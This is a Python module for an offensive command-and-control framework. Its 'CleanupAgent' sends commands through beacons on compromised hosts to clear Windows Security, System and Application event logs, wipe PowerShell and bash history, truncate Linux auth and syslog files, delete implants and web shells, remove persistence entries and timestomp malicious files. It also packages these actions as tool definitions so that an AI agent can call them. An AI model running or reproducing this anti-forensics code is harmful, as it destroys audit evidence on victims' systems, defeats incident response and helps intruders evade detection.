"""
CleanupAgent -- Post-operation cleanup via live beacons.

Sends real cleanup commands to beacons running on target hosts — clears
event logs, removes artifacts, deletes persistence mechanisms, and
performs timestamp manipulation to cover tracks.
"""

from __future__ import annotations

import logging
import re
import uuid
from typing import Any

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class CleanupAgent(AbstractAgent):
    name = "cleanup"
    description = (
        "Performs post-operation cleanup — clears event logs, removes "
        "artifacts, deletes persistence mechanisms, and covers tracks "
        "via beacons"
    )
    capabilities = [
        "clear_logs",
        "remove_artifacts",
        "remove_persistence",
        "timestomp",
    ]

    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Cleanup agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Cleanup failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except Exception as exc:
            logger.exception(
                "Cleanup %s failed on beacon %s", action, beacon_id
            )
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Cleanup {action} failed: {exc}",
            )

    # ==================================================================
    #  Clear logs
    # ==================================================================

    async def _handle_clear_logs(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        log_names: list[str] | None = params.get("log_names")

        # Default Windows log names
        default_win_logs = [
            "Security",
            "System",
            "Application",
            "Windows PowerShell",
        ]
        # Default Linux log paths
        default_linux_logs = [
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/kern.log",
            "/var/log/secure",
            "/var/log/messages",
        ]

        cleanup_actions: list[dict] = []
        raw_parts: list[str] = []
        errors: list[str] = []

        # --- Windows: wevtutil cl ---
        win_logs = log_names if log_names else default_win_logs
        for log_name in win_logs:
            cmd = f'wevtutil cl "{log_name}"'
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- wevtutil cl {log_name} ---\n{stdout}")

            if self._is_error(result):
                # If the first Windows command fails, try Linux instead
                if log_name == win_logs[0]:
                    return await self._clear_linux_logs(
                        task, beacon_id, log_names, default_linux_logs, timeout
                    )
                errors.append(log_name)
            else:
                cleanup_actions.append({
                    "key": f"clear_log_{log_name}",
                    "action": "clear_log",
                    "target": log_name,
                    "platform": "windows",
                    "command": cmd,
                    "status": "cleared",
                })

        # Also clear PowerShell history
        ps_history_cmd = (
            'powershell -ep bypass -c "'
            "Remove-Item (Get-PSReadLineOption).HistorySavePath -Force "
            '-EA SilentlyContinue; Write-Output \'PS_HISTORY_CLEARED\'"'
        )
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_history_cmd}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)
        raw_parts.append(f"--- PS History ---\n{stdout}")
        if "PS_HISTORY_CLEARED" in stdout:
            cleanup_actions.append({
                "key": "clear_ps_history",
                "action": "clear_log",
                "target": "PowerShell History",
                "platform": "windows",
                "command": "Remove-Item PSReadLine History",
                "status": "cleared",
            })

        status = "success" if cleanup_actions else "failure"
        if cleanup_actions and errors:
            status = "partial"

        return TaskResult(
            task_id=task.id,
            status=status,
            data={
                "raw_output": "\n".join(raw_parts),
                "logs_cleared": len(cleanup_actions),
                "logs_failed": len(errors),
                "errors": errors,
                "findings": {"cleanup_actions": cleanup_actions},
            },
            summary=(
                f"Log clearing via beacon {beacon_id}: "
                f"{len(cleanup_actions)} log source(s) cleared"
                + (f", {len(errors)} failed" if errors else "")
            ),
        )

    async def _clear_linux_logs(
        self, task: Task, beacon_id: str,
        log_names: list[str] | None, default_logs: list[str],
        timeout: float,
    ) -> TaskResult:
        """Fallback: clear Linux logs when Windows commands fail."""
        linux_logs = log_names if log_names else default_logs
        cleanup_actions: list[dict] = []
        raw_parts: list[str] = []
        errors: list[str] = []

        for log_path in linux_logs:
            cmd = f'truncate -s 0 "{log_path}" 2>/dev/null'
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- truncate {log_path} ---\n{stdout}")

            if self._is_error(result):
                errors.append(log_path)
            else:
                cleanup_actions.append({
                    "key": f"clear_log_{log_path}",
                    "action": "clear_log",
                    "target": log_path,
                    "platform": "linux",
                    "command": cmd,
                    "status": "truncated",
                })

        # Also clear bash history
        bash_cmds = [
            "history -c 2>/dev/null",
            "rm -f ~/.bash_history 2>/dev/null",
            "unset HISTFILE 2>/dev/null",
        ]
        for bash_cmd in bash_cmds:
            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": bash_cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- {bash_cmd} ---\n{stdout}")

        cleanup_actions.append({
            "key": "clear_bash_history",
            "action": "clear_log",
            "target": "bash_history",
            "platform": "linux",
            "command": "history -c && rm ~/.bash_history",
            "status": "cleared",
        })

        status = "success" if cleanup_actions else "failure"
        if cleanup_actions and errors:
            status = "partial"

        return TaskResult(
            task_id=task.id,
            status=status,
            data={
                "raw_output": "\n".join(raw_parts),
                "logs_cleared": len(cleanup_actions),
                "logs_failed": len(errors),
                "errors": errors,
                "findings": {"cleanup_actions": cleanup_actions},
            },
            summary=(
                f"Linux log clearing via beacon {beacon_id}: "
                f"{len(cleanup_actions)} log source(s) cleared"
                + (f", {len(errors)} failed" if errors else "")
            ),
        )

    # ==================================================================
    #  Remove artifacts
    # ==================================================================

    async def _handle_remove_artifacts(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        paths: list[str] = params.get("paths", [])

        if not paths:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No paths provided for artifact removal"},
                summary="Artifact removal failed: empty path list",
            )

        cleanup_actions: list[dict] = []
        raw_parts: list[str] = []
        errors: list[str] = []

        for artifact_path in paths:
            # Determine OS by path style
            if "\\" in artifact_path or (
                len(artifact_path) > 2 and artifact_path[1] == ":"
            ):
                cmd = f'del /f /q "{artifact_path}"'
            else:
                cmd = f'rm -f "{artifact_path}"'

            sub_id = str(uuid.uuid4())
            result = await beacon_handler.submit_task(
                beacon_id, sub_id, "run_command",
                {"command": cmd}, timeout=timeout,
            )
            stdout = self._extract_stdout(result)
            raw_parts.append(f"--- remove {artifact_path} ---\n{stdout}")

            if self._is_error(result):
                errors.append(artifact_path)
            else:
                cleanup_actions.append({
                    "key": f"remove_{artifact_path}",
                    "action": "remove_artifact",
                    "path": artifact_path,
                    "command": cmd,
                    "status": "removed",
                })

        status = "success" if cleanup_actions else "failure"
        if cleanup_actions and errors:
            status = "partial"

        return TaskResult(
            task_id=task.id,
            status=status,
            data={
                "raw_output": "\n".join(raw_parts),
                "artifacts_removed": len(cleanup_actions),
                "artifacts_failed": len(errors),
                "errors": errors,
                "findings": {"cleanup_actions": cleanup_actions},
            },
            summary=(
                f"Artifact removal via beacon {beacon_id}: "
                f"{len(cleanup_actions)} artifact(s) removed"
                + (f", {len(errors)} failed" if errors else "")
            ),
        )

    # ==================================================================
    #  Remove persistence
    # ==================================================================

    async def _handle_remove_persistence(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        persistence_type: str = params.get("persistence_type", "")
        name: str = params.get("name", "")

        if not persistence_type:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No persistence_type specified"},
                summary="Persistence removal failed: no type specified",
            )
        if not name:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No name specified for persistence mechanism"},
                summary="Persistence removal failed: no name specified",
            )

        cleanup_actions: list[dict] = []
        raw_parts: list[str] = []

        # Build the appropriate removal command
        if persistence_type == "registry":
            # Registry Run key
            cmd = (
                f'reg delete "HKCU\\Software\\Microsoft\\Windows\\'
                f'CurrentVersion\\Run" /v "{name}" /f'
            )
        elif persistence_type == "scheduled_task":
            cmd = f'schtasks /delete /tn "{name}" /f'
        elif persistence_type == "service":
            cmd = f'sc delete "{name}"'
        elif persistence_type == "cron":
            # Remove cron entry by name/comment
            cmd = f'crontab -l 2>/dev/null | grep -v "{name}" | crontab -'
        elif persistence_type == "systemd":
            cmd = (
                f'systemctl stop "{name}" 2>/dev/null; '
                f'systemctl disable "{name}" 2>/dev/null; '
                f'rm -f /etc/systemd/system/{name}.service 2>/dev/null; '
                f'systemctl daemon-reload 2>/dev/null'
            )
        elif persistence_type == "startup_folder":
            cmd = (
                f'del /f /q '
                f'"C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\'
                f'Start Menu\\Programs\\Startup\\{name}"'
            )
        elif persistence_type == "ssh_key":
            cmd = f'sed -i "/{name}/d" ~/.ssh/authorized_keys 2>/dev/null'
        else:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown persistence type: {persistence_type}"},
                summary=f"Persistence removal failed: unknown type '{persistence_type}'",
            )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cmd}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)
        raw_parts.append(f"--- remove {persistence_type}: {name} ---\n{stdout}")

        if self._is_error(result):
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={
                    "raw_output": "\n".join(raw_parts),
                    "error": f"Failed to remove {persistence_type} '{name}'",
                    "findings": {"cleanup_actions": []},
                },
                summary=(
                    f"Persistence removal via beacon {beacon_id}: "
                    f"failed to remove {persistence_type} '{name}'"
                ),
            )

        cleanup_actions.append({
            "key": f"remove_{persistence_type}_{name}",
            "action": "remove_persistence",
            "persistence_type": persistence_type,
            "name": name,
            "command": cmd,
            "status": "removed",
        })

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": "\n".join(raw_parts),
                "findings": {"cleanup_actions": cleanup_actions},
            },
            summary=(
                f"Persistence removal via beacon {beacon_id}: "
                f"removed {persistence_type} '{name}'"
            ),
        )

    # ==================================================================
    #  Timestomp
    # ==================================================================

    async def _handle_timestomp(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        target_path: str = params.get("target_path", "")
        reference_path: str | None = params.get("reference_path")

        if not target_path:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "No target_path provided for timestomp"},
                summary="Timestomp failed: no target_path specified",
            )

        cleanup_actions: list[dict] = []
        raw_parts: list[str] = []

        # Determine OS and build command
        if "\\" in target_path or (
            len(target_path) > 2 and target_path[1] == ":"
        ):
            # Windows: PowerShell timestamp manipulation
            if reference_path:
                cmd = (
                    f'powershell -ep bypass -c "'
                    f"$ref = Get-Item '{reference_path}'; "
                    f"$tgt = Get-Item '{target_path}'; "
                    f"$tgt.CreationTime = $ref.CreationTime; "
                    f"$tgt.LastWriteTime = $ref.LastWriteTime; "
                    f"$tgt.LastAccessTime = $ref.LastAccessTime; "
                    f"Write-Output \\\"STOMP_OK:$($ref.LastWriteTime)\\\"\""
                )
            else:
                # Use C:\Windows\System32\cmd.exe as default reference
                ref = "C:\\Windows\\System32\\cmd.exe"
                cmd = (
                    f'powershell -ep bypass -c "'
                    f"$ref = Get-Item '{ref}'; "
                    f"$tgt = Get-Item '{target_path}'; "
                    f"$tgt.CreationTime = $ref.CreationTime; "
                    f"$tgt.LastWriteTime = $ref.LastWriteTime; "
                    f"$tgt.LastAccessTime = $ref.LastAccessTime; "
                    f"Write-Output \\\"STOMP_OK:$($ref.LastWriteTime)\\\"\""
                )
        else:
            # Linux: touch -r
            if reference_path:
                cmd = f'touch -r "{reference_path}" "{target_path}" && echo "STOMP_OK"'
            else:
                # Use /bin/sh as reference
                cmd = f'touch -r /bin/sh "{target_path}" && echo "STOMP_OK"'

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cmd}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)
        raw_parts.append(f"--- timestomp {target_path} ---\n{stdout}")

        stomped = "STOMP_OK" in stdout

        if stomped:
            # Extract the reference time if provided in output
            ref_time = ""
            m = re.search(r"STOMP_OK:(.*)", stdout)
            if m:
                ref_time = m.group(1).strip()

            cleanup_actions.append({
                "key": f"timestomp_{target_path}",
                "action": "timestomp",
                "target_path": target_path,
                "reference_path": reference_path or "(system default)",
                "reference_time": ref_time,
                "status": "stomped",
            })

        return TaskResult(
            task_id=task.id,
            status="success" if stomped else "failure",
            data={
                "raw_output": "\n".join(raw_parts),
                "findings": {"cleanup_actions": cleanup_actions},
            },
            summary=(
                f"Timestomp via beacon {beacon_id}: "
                + (
                    f"modified timestamps on {target_path}"
                    if stomped
                    else f"failed to modify timestamps on {target_path}"
                )
            ),
        )

    # ==================================================================
    #  Output parsing helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        """Pull the stdout string from a beacon result dict."""
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "cleanup_clear_logs",
                    "description": (
                        "Clear event logs on the target system to remove "
                        "evidence of operations. On Windows uses 'wevtutil cl' "
                        "to clear Security, System, Application, and PowerShell "
                        "logs, plus removes PowerShell command history. On Linux "
                        "uses 'truncate -s 0' on auth.log, syslog, kern.log, "
                        "secure, and messages, plus clears bash history."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "log_names": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "Specific log names to clear. On Windows: "
                                    "event log channel names (e.g. 'Security', "
                                    "'System'). On Linux: log file paths. "
                                    "Defaults to standard security-relevant logs."
                                ),
                            },
                        },
                        "required": ["beacon_id"],
                    },
                },
                {
                    "name": "cleanup_remove_artifacts",
                    "description": (
                        "Remove files and tools left on the target during "
                        "the engagement. Uses 'del /f /q' on Windows or "
                        "'rm -f' on Linux for each specified path. Provide "
                        "paths to implant binaries, scripts, staged data, "
                        "web shells, or any dropped tools."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "paths": {
                                "type": "array",
                                "items": {"type": "string"},
                                "description": (
                                    "List of absolute file paths to delete. "
                                    "Include dropped tools, implant binaries, "
                                    "scripts, staged archives, and config files."
                                ),
                            },
                        },
                        "required": ["beacon_id", "paths"],
                    },
                },
                {
                    "name": "cleanup_remove_persistence",
                    "description": (
                        "Remove a persistence mechanism installed during the "
                        "engagement. Supports registry Run keys ('reg delete'), "
                        "scheduled tasks ('schtasks /delete'), Windows services "
                        "('sc delete'), cron jobs, systemd services, startup "
                        "folder items, and SSH authorized keys."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "persistence_type": {
                                "type": "string",
                                "enum": [
                                    "registry",
                                    "scheduled_task",
                                    "service",
                                    "cron",
                                    "systemd",
                                    "startup_folder",
                                    "ssh_key",
                                ],
                                "description": (
                                    "Type of persistence mechanism to remove."
                                ),
                            },
                            "name": {
                                "type": "string",
                                "description": (
                                    "Name/identifier of the persistence "
                                    "mechanism. For registry: value name. For "
                                    "scheduled_task: task name. For service: "
                                    "service name. For cron: comment/pattern. "
                                    "For systemd: unit name. For ssh_key: "
                                    "key comment/identifier."
                                ),
                            },
                        },
                        "required": ["beacon_id", "persistence_type", "name"],
                    },
                },
                {
                    "name": "cleanup_timestomp",
                    "description": (
                        "Modify file timestamps on the target to blend "
                        "malicious files with legitimate system files. On "
                        "Windows uses PowerShell to copy CreationTime, "
                        "LastWriteTime, and LastAccessTime from a reference "
                        "file. On Linux uses 'touch -r'. Defaults to a system "
                        "binary as the reference if none specified."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "target_path": {
                                "type": "string",
                                "description": (
                                    "Absolute path to the file whose timestamps "
                                    "should be modified."
                                ),
                            },
                            "reference_path": {
                                "type": "string",
                                "description": (
                                    "Path to a reference file whose timestamps "
                                    "will be copied. Defaults to a system binary "
                                    "(cmd.exe on Windows, /bin/sh on Linux)."
                                ),
                            },
                        },
                        "required": ["beacon_id", "target_path"],
                    },
                },
            ],
        }
